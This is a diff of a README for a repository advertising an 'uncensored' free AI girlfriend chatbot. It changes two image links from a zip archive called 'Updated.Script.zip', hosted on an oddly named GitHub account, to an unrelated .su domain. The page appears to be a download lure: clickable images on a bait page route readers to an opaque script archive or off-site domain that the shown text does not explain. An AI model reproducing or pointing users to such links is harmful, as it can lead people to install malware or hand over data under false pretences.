@@ -7,11 +7,11 @@ Uncensored AI Girlfriend Companion Chatbot – NSFW & SFW Anime Waifu Roleplay w
 **Your Dream AI Girlfriend, Boyfriend, or Friend – No Filters. No Paywalls. No Login. No Limits. 100% Free and Open Source.**
 
 [![512x512bb](https://github.com/user-attachments/assets/38aa0939-d5d5-4617-a499-e669ae216eaa)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 
 [![image](https://github.com/user-attachments/assets/6b263a1a-2092-4721-8f12-2be9f4a1443b)
-](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
+](https://hardware-gui.su/)
 
 ---
 
